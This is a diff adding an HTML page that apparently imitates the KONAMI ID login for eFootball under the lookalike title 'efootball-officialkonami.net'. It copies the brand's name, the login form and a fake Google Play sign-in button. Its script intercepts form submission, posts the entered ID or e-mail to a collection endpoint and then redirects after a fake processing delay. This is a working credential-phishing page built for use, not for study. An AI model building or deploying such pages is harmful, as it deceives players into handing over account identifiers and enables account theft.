@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>efootball-officialkonami.net</title>
+    <link rel="stylesheet" href="style.css">
+    <!-- Link to Google Fonts for similar typography -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        /* Add this CSS for the new buttons */
+        .extra-options {
+            margin-top: 40px;
+            padding: 25px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid #333;
+            border-radius: 8px;
+            text-align: center;
+        }
+        
+        .extra-options p {
+            color: #999;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+        
+        .note {
+            margin-top: 20px;
+            font-size: 12px !important;
+            color: #666 !important;
+        }
+        
+        .btn-full-website,
+        .btn-login-only {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            text-decoration: none;
+            border-radius: 4px;
+            font-weight: 600;
+            text-align: center;
+            transition: all 0.3s;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        .btn-full-website {
+            background: #0070cc;
+            color: white;
+            border: none;
+        }
+        
+        .btn-full-website:hover {
+            background: #005ca9;
+            transform: translateY(-2px);
+        }
+        
+        .btn-login-only {
+            background: transparent;
+            color: #999;
+            border: 1px solid #444;
+        }
+        
+        .btn-login-only:hover {
+            background: rgba(255, 255, 255, 0.05);
+            color: white;
+            border-color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="top-corner-box">
+        <span class="konami-red">KONAMI</span>
+    </div>
+
+    <div class="login-container">
+        <div class="logo-box">
+            <!-- Placeholder for KONAMI logo image -->
+            <div class="logo-placeholder">KONAMI ID</div>
+        </div>
+        <form id="loginForm"  data-netlify="true" class="login-form" netlify>
+            <div class="input-group">
+                <input type="text" id="username" name="username" required>
+                <label for="username">KONAMI ID / E-MAIL ADDRESS</label>
+            </div>
+            <button type="submit" class="btn-login">LOGIN</button>
+
+            <div class="divider">OR</div>
+
+            <button type="button" class="btn-google">
+                <!-- Placeholder for Google Play icon -->
+                <span class="google-icon">G</span> Log in with Google Play
+            </button>
+
+            <div class="register-link">
+                Don't have a KONAMI ID? <a href="#" class="register-red">Register</a>
+            </div>
+        </form>
+        
+        <!-- ADDED THIS SECTION: Extra Options -->
+        <div class="extra-options">
+            <p>Alternative login options:</p>
+            <a href="index.html" class="btn-full-website">
+                Visit Full eFootball Website
+            </a>
+            <p class="note">Or click below for a different login experience:</p>
+            <a href="login.html" class="btn-login-only">
+                Go to Login Page Only
+            </a>
+        </div>
+    </div>
+
+    <footer class="page-footer">
+        <div class="footer-links">
+            <a href="#">Terms of Use / Privacy (KONAMI ID)</a>
+            <a href="#">Trademarks</a>
+            <a href="#">Support</a>
+            <a href="#">Company Information</a>
+        </div>
+    </footer>
+
+    <!-- JavaScript for form handling will be added later -->
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const loginForm = document.getElementById('loginForm');
+        
+        if (loginForm) {
+            loginForm.addEventListener('submit', function(event) {
+                // 1. CRITICAL: This stops the form's default submission
+                event.preventDefault();
+                event.stopPropagation(); // Extra safety to stop the event
+                
+                console.log('Form submit intercepted!');
+                
+                // Get the username
+                const username = document.getElementById('username').value;
+                
+                // Send data to server/email
+                sendLoginData(username);
+                
+                // 2. Simple 2-second delay to simulate processing (optional)
+                setTimeout(function() {
+                    // 3. REDIRECT to the confirmation page
+                    window.location.href = "login.html";
+                }, 2000); // 2000 milliseconds = 2 seconds
+                
+                // OPTIONAL: Show a loading message on the button
+                const submitBtn = loginForm.querySelector('.btn-login');
+                const originalText = submitBtn.textContent;
+                submitBtn.textContent = 'Processing...';
+                submitBtn.disabled = true;
+                
+                // Reset button text after delay (optional cleanup)
+                setTimeout(function() {
+                    submitBtn.textContent = originalText;
+                    submitBtn.disabled = false;
+                }, 2000);
+                
+                return false; // Another safety measure
+            });
+        } else {
+            console.error('ERROR: Could not find form with id="loginForm"');
+        }
+    });
+    
+    function sendLoginData(username) {
+        // Send data to your backend server
+        fetch('http://localhost:3000/send-login', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                username: username,
+                timestamp: new Date().toISOString(),
+                source: 'konami_id_login'
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Login data sent:', data);
+        })
+        .catch(error => {
+            console.error('Error sending login data:', error);
+        });
+    }
+    </script>
+</body>
+</html>
